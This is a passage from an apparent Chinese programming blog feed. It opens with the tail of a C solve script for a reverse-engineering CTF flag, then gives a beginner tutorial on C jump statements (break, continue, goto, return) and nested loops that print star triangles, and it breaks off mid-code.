class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>,</span><br><span class="line">        <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>,</span><br><span class="line">        <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>,</span><br><span class="line">        <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> v6[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    v6[<span class="number">0</span>] = <span class="number">65</span> ;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">67</span> ;</span><br><span class="line">    v6[<span class="number">2</span>] = <span class="number">84</span> ;</span><br><span class="line">    v6[<span class="number">3</span>] = <span class="number">70</span> ;</span><br><span class="line">    v6[<span class="number">4</span>] = <span class="number">123</span> ;</span><br><span class="line">    v6[<span class="number">17</span>] = <span class="number">125</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* p;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (p = &amp;v6[<span class="number">5</span>], i = <span class="number">0</span>; p != &amp;v6[<span class="number">5</span>] + <span class="number">12</span>; ++p, ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt; <span class="number">128</span>; ++c) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v4[i] == _data_start__[c - <span class="number">1</span>]) &#123;</span><br><span class="line">                *p = c;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-8-跳转控制和嵌套</title>
      <link href="/2023-09-27-0671b7d09817/"/>
      <url>/2023-09-27-0671b7d09817/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是跳转控制">什么是跳转控制</h1><p>有时候,我们需要代码直接从一个位置直接转到另一个特定的位置继续执行,此时,我们就需要进行跳转.</p><p>例如,我们在执行某个循环时,突然到达了某个边界条件,需要立即停止循环(或者没有必要进行余下的循环),此时我们就可以直接跳出循环.</p><p>再例如,我们可能需要在同一个函数内进行一个大跨度的回溯,我们如果开循环的话,整个代码都要放在一个代码块里,如果不方便的话,我们就可以直接无条件跳转到前面.</p><h1 id="c语言跳转控制相关的语句">C语言跳转控制相关的语句</h1><h2 id="break语句">break语句</h2><p>首先来看一下<code>标准</code>的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928224409360.png" alt="image-20230928224409360" style="zoom:45%;" /><p>break语句,可以理解为&quot;跳出&quot;语句,顾名思义,用于跳出一个<code>循环体</code>或<code>switch的语句</code>.</p><p>事实上,我们在前面讲解<code>switch语句</code>的时候就已经使用到break语句,但是当时只是知道能用它来结束一个switch语句.</p><p>换句话说,break语句用于跳出一个代码块(一个复合语句),但是这个代码块仅限于<code>循环体</code>或<code>switch语句内</code>.并且,break语句会完全终止一个循环,无论循环语句中有什么需要执行的部分,都不再执行,直接跳转到整个循环后面紧邻的第一条语句继续执行.</p><p>重要的一点是,break只能跳出它直接所在的循环,而不能连续跳出,也正如标准所述:<code>break语句不能用于打破多重嵌套循环</code>.至于嵌套循环,我们很快会讲解到.</p><p>我们做一个简单的例子来使用一下break语句:</p><h3 id="例题">例题:</h3><p>输入一个正整数n,<code>判断其是否为素数</code>(素数为一个大于1的自然数，除了1和它本身外，不能被其他自然数整除).</p><p>解决:我们从定义出发,很容易想出一个暴力的做法—那就是从2到n-1依次判断是否为n的因数,如果中间有任何一个数是因数,则这个数n立即被判定为合数.</p><p>代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, is_prime = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n - <span class="number">1</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">is_prime = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (is_prime)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上可以有更加高效/简单的写法,但是为了说明问题,这里采用了这样的写法.</p><p>这个代码使用了一个is_prime的int变量作为<code>标志</code>,用于记录最终结果—n是否为素数.</p><p>我们开一个i从2到n-1的循环,将循环变量i作为n可能的因数,去和n做除法,如果判断出能够<code>整除</code>,就说明当前的i是n的因数.</p><p>然后,根据我们的算法,只要i在2~n-1中有任何一个是n的因数,就说明n不是素数,此时,后面的循环已经没有必要执行了,因为这里已经判断出n不是素数了,就不需要再继续了.</p><p>那么我们在if成立后,先把is_prime变量设置为0(也就是标志着n不是素数),然后使用一个<code>break语句</code>来直接结束这个循环,继续后面的代码.最后,我们使用一个if…else来进行判断,对应输出yes或no即可.</p><p>其中需要注意的是,我们使用到了一个<code>%运算符</code>,这个运算符叫<code>求模运算符</code>,用于求一个数除另一个数的余数,这两个数要求必须是整数.例如<code>7%4</code>的结果就是<code>3</code>;<code>5%1</code>的结果就是<code>0</code>.有关求模将会在讲解运算符时进行详细说明.</p><h2 id="continue语句">continue语句</h2><p>有时候,我们需要的仅仅是结束当前的<code>一次循环</code>,而不是结束整个循环语句,那么,我们需要使用<code>continue语句</code>来实现.</p><p>需要注意的是,所谓&quot;结束&quot;,仅仅指的是结束循环体,这意味着for(表达式1;表达式2;表达式3)并不受影响,我们在结束当前的一次循环时,意味着continue后面直到循环体结束的所有代码不再执行,转而直接开始下一次循环,同时,<code>表达式3</code>不受任何影响,它仍然需要执行一次再进行下一次循环的<code>表达式2</code>的判断.</p><p>同样来看一下<code>标准</code>的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928231836072.png" alt="image-20230928231836072" style="zoom:45%;" /><p>就是这么简单,我们同样以一个例题来举例子:</p><h3 id="例题">例题:</h3><p>输出100以内所有不能被3整除的正整数.</p><p>解决:很简单,只需要剔除能被3整除的数即可,正向思维的话,我们直接把不能被3整除的数输出即可,但是这里作为例子,我们反过来,如果遇到能被3整除的数,则跳过该次循环.</p><p>代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>) <span class="comment">// 如果i除3的余数为0,也就是i能被3整除</span></span><br><span class="line"><span class="keyword">continue</span>; <span class="comment">// 则跳过这次循环之后的所有代码,这里也就是跳过输出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i); <span class="comment">// 否则输出i</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码就是这样,其中,再说明一下,我们把<code>int i=1</code>,也就是i的声明和初始化都放到for的第一个表达式中了,这样是没有问题的,但是这意味着这个for循环一旦结束,变量i就不能使用了,换句话说i在for循环的这个<code>块作用域</code>内.这涉及到变量的<code>作用域</code>,将会在后面进行详细的讲解.</p><h2 id="goto语句">goto语句</h2><p>除了上面的两种跳转语句,我们还有一种更加直接的<code>goto语句</code>,可以直接跳转到同函数内的任意位置,所以它也叫无条件跳转语句.</p><p>这是标准的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929000327639.png" alt="image-20230929000327639" style="zoom: 45%;" /><p>初学,我们无需关心那么多,我们只需要知道,<code>goto语句</code>和其所控制的<code>标号</code>只能在同一个函数内.</p><p>那么,一个完整的goto语句使用需要哪些内容呢?我们首先需要一个或多个标号.</p><h3 id="标号">标号</h3><p>同样先来看标准的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929001604610.png" alt="image-20230929001604610" style="zoom:45%;" /><p>也就是说,<code>标识符:</code>,<code>case 常量表达式:</code>,<code>default :</code>这3种实际上都是标号,他并不是独立的,实际上,他是对于某条语句进行了一个标号.</p><p>在switch语句中,我们习惯把<code>case 常量表达式:</code>写在单独的一行,但是实际上,它是下一行第一条语句的标号:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个程序中,每一个<code>case 常量表达式:</code>和最后的<code>default :</code>都是后面紧随的<code>printf(...);</code>这条语句(…为省略中间的内容)的标号!</p><h3 id="使用goto语句进行跳转">使用goto语句进行跳转</h3><p>那么goto语句实际上使用的是前面3中标号的第一个,也就是<code>标识符:</code>,有了标号,我们就可以直接这样使用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第1个输出\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第2个输出\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> first;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第3个输出\n&quot;</span>);</span><br><span class="line">first:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第4个输出\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929002235202.png" alt="image-20230929002235202" style="zoom:40%;" /><p>我们在程序中为<code>printf(&quot;第4个输出\n&quot;);</code>提供了一个标号first,我们在输出<code>&quot;第3个输出\n&quot;</code>之前使用goto语句进行跳转,跳转到后面继续执行,如此,第3个printf()函数的调用就被跳过了.</p><h3 id="注意">注意:</h3><p>goto语句可以说的上是非常简单粗暴,如果各位学习过汇编语言,就会发现goto语句和汇编中的loop非常相似!</p><p>但是简单粗暴意味着,它很容易破坏程序的结构,说简单点就是,如果一个程序在运行中来回不停地使用goto进行到处的跳转,那么很可能导致整个程序的运行逻辑乱七八糟的,毫无章法.</p><p>所以,C语言中的goto语句常常被许多人诟病,从而强烈建议不要使用该语句.</p><p>至于本人,我对goto语句的看法是:只要合理利用,就是好的.依然是那句话:C语言提供给了我们极大的自由度,至于如何利用好这种自由度,就看程序设计者本人的能力了.</p><p>那么goto语句,最实用的一个用途就是<code>一次性跳出多层嵌套的循环</code>,这将在下面进行讲解.</p><h2 id="return语句">return语句</h2><p>标准的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929004440108.png" alt="image-20230929004440108" style="zoom:45%;" /><p>关于return语句,应该把他放在<code>函数</code>的部分进行讲解,到目前为止,我们所有的程序都只用了一个函数:<code>main函数</code>就完成了任务,当程序越发复杂,我们需要把功能独立出来,这时候函数就派上用场了.</p><p>在此之前,我们只使用main函数来完成所有的功能.</p><p>那么return语句,就是用于结束一个函数,并返回一个值作为这个函数的返回值.</p><p>返回值很好理解,我们之前说过,C语言的函数和数学意义上的函数完全一致,那么如果我们有<code>y=f(x)</code>,最终计算出来的y就是函数的值,也就是函数值,return语句就是用于返回这个最终计算的值的.</p><p>在main函数中,我们默认使用<code>return 0;</code>返回一个0作为main函数的返回值,在main中,返回值为0代表这个程序正常结束:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//结束main函数并返回0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么为什么是整数<code>0</code>呢?我们之前提到过,<code>int main()</code>中第一个代表这个函数的返回值类型,那么这里的int说明main的返回值应该是一个int类型的值,那么常量0就是一个int类型的常量.</p><p>另外,如果一个函数的返回值类型是<code>void</code>,即返回值为空,那么必须写<code>return;</code>来返回,而不能带有任何表达式.</p><p>这里先简单说明一下,至于return语句的细节会在后面详细讲解.</p><p>​—WAHAHA 2023.9.28</p><h1 id="第一个难点-循环嵌套">第一个难点—循环嵌套</h1><h2 id="什么是嵌套">什么是嵌套</h2><p><code>嵌套</code>顾名思义,就是一个语句内套着另一个语句.嵌套并不是说仅仅给循环,任意语句均可以互相随意嵌套以完成各种功能.</p><p>如果对应到if语句,那么就是一层条件满足后继续进一步判断下一层条件.</p><p>对应到循环,就是循环嵌套.也就是一层循环中套着另一层循环.</p><p>循环嵌套写起来十分简单,只需要简单的将一个循环放在另外一个循环里面即可.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 这段代码的作用是输出 0~99</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i * <span class="number">10</span> + j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然上面这个代码的功能仅需要一个循环即可实现,这里为了作为演示,有上面这种替代的写法.</p><h2 id="最常用的嵌套-for嵌套">最常用的嵌套—for嵌套</h2><h3 id="例子1-直角三角形">例子1-直角三角形</h3><h4 id="题目">题目</h4><p>输出一个直角边长为5的等腰三角形,要求使用循环,输出结果要求如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">***</span><br><span class="line">****</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><h4 id="分析">分析</h4><p>我们要输出这个图形,需要从第一行向下一行一行的输出,首先约定,<code>从今以后,我们所有的行,列都从0开始计数</code>.也就是说,逻辑上的第1行,我们称之为第0行.</p><p>第0行输出1个’*‘字符,第1行输出2个’*’,…,第n行输出n+1个’*’,…,第5行输出6个’*’.</p><p>我们可以看出,输出逻辑中有两个关键值一直在变,那就是<code>当前的行号</code>和<code>当前这行需要输出的'\*'数</code>.</p><p>而且,必须先确定一行,然后再针对这行进行逐个输出,那么很自然地,我们就能想到使用循环嵌套来实现(没想到也没关系,先来看看代码).</p><h4 id="代码">代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个直角三角形</span></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123; <span class="comment">// i指定行号,其中的 i++ 完全等价于i=i+1,此时不必有任何疑惑</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; i+<span class="number">1</span>; j++) &#123; <span class="comment">// j指定该行输出多少个字符&#x27;*&#x27;,其中的 j++ 完全等价于j=j+1,此时不必有任何疑惑</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>); <span class="comment">// 输出一个&#x27;*&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); <span class="comment">// 内层循环输出完一行后输出换行准备处理下一行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="执行过程">执行过程</h4><p>执行的过程如下:</p><p>1.首先,进入外层的第一次循环,此时i为0,也就是正在处理第0行,然后保持i==0不变,进入第二层循环;</p><p>根据我们的公式,第n行需要输出n+1个’*’,那么第0行需要输出0+1也就是1个’*’.但是我们需要一次性写完所有行的循环,那么这里我们应该把公式放进去,那么外层循环的i就相当于这里的n,内层循环每次要执行i+1次,那么就应该是</p><p><code>for (j = 0; j &lt; i+1; j++)</code></p><p>当第一次内层循环(i一直为0)结束后,屏幕上已经输出了1个’*’—循环了i+1次也就是1次.此时外层第一次循环还没结束,因为还有一个<code>printf(&quot;\n&quot;);</code>没有执行,执行完这行后,会跳到下一行准备继续输出.</p><p>这时屏幕上是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">[注意光标在这里,因为已经换行了]</span><br></pre></td></tr></table></figure><p>2.外层循环内的一个内层循环和一个printf(&quot;\n&quot;);语句已经执行完,这时i++,变为1,准备第二次循环,也就是准备输出第1行(注意这是图像上的第二行)的2个’*’;</p><p>根据我们的公式,第1行需要输出1+1也就是2个’*’,需要内层循环两次;</p><p><code>for (j = 0; j &lt; i+1; j++)</code>在这时,j被重新赋值为0—也就是说这次内层循环的执行和上一次没有任何关系!接着,j从0到i(也就是1),循环2次,屏幕上输出了2个’*’,此时外层第二次循环还没结束,因为还有一个<code>printf(&quot;\n&quot;);</code>没有执行,执行完这行后,会跳到下一行准备继续输出.</p><p>这时屏幕上是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">[注意光标在这里,因为已经换行了]</span><br></pre></td></tr></table></figure><p>3.外层循环内的一个内层循环和一个printf(&quot;\n&quot;);语句已经执行完,这时i++,变为2,准备第三次循环…</p><p>如此往复递增…</p><p>4.当第5次外层循环执行完毕,屏幕上是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">***</span><br><span class="line">****</span><br><span class="line">*****</span><br><span class="line">[注意光标在这里,因为已经换行了]</span><br></pre></td></tr></table></figure><p>此时i再自增到6,不满足条件,外层循环结束,至此,整个嵌套循环彻底结束.</p><h3 id="例子2-左右对称的等腰三角形">例子2-左右对称的等腰三角形</h3><h4 id="题目">题目</h4><p>输出一个高度为5的左右对称的等腰三角形,要求使用循环,输出结果要求如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    *</span><br><span class="line">   ***</span><br><span class="line">  *****</span><br><span class="line"> *******</span><br><span class="line">*********</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="分析-代码">分析&amp;代码</h4><p>从例子1我们可以有所体会—我们需要推导出每个循环应该执行的次数(甚至需要考虑从哪个值到哪个值).</p><p>这个例子就更进一步,需要我们推出更复杂的式子(没复杂到哪去),我们来考虑,这回按照写代码的思路来引导各位.</p><p>1.首先依旧,我们需要输出5行,秉承着一行一行处理的思路,我们仍然选择开一个循环,让i从0~4进行控制这5行,那么我们有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为5的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.假设我们已经开始处理第i行—也就是已经开始了某一次循环(注意,这里说的是某一次,而不是第一次,读者去考虑).</p><p>那么我们观察图形,第0行需要1个’*’,第1行需要3个’*’,第2行需要5个’*’,…那么我们就能推出公式:</p><p><code>第 i 行需要 2*i+1 个'\*'</code></p><p>那么很显然,我们需要这样,同时不要忘了最后的换行:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为5的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i,k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">2</span> * i + <span class="number">1</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.我们运行测试一下,结果发现全部居左了:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930001507386.png" alt="image-20230930001507386" style="zoom:33%;" /></p><p>​问题很容易发现,我们忘记在每一行开头输出特定数量的空格<code>' '</code>了.</p><p>4.那么同样去观察规律,同理很容易得出:</p><p>​<code>如果一共有i行(从0开始计数),那么第j行需要i-j行</code></p><p>例如,我们一共有4行(从0开始计数),那么第2行(也就是图像的第三行)需要4-2也就是2个空格</p><p>这样代码就需要补全为这样(注意每次外层循环中,要先进行空格的输出,然后才是’*'的输出):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> 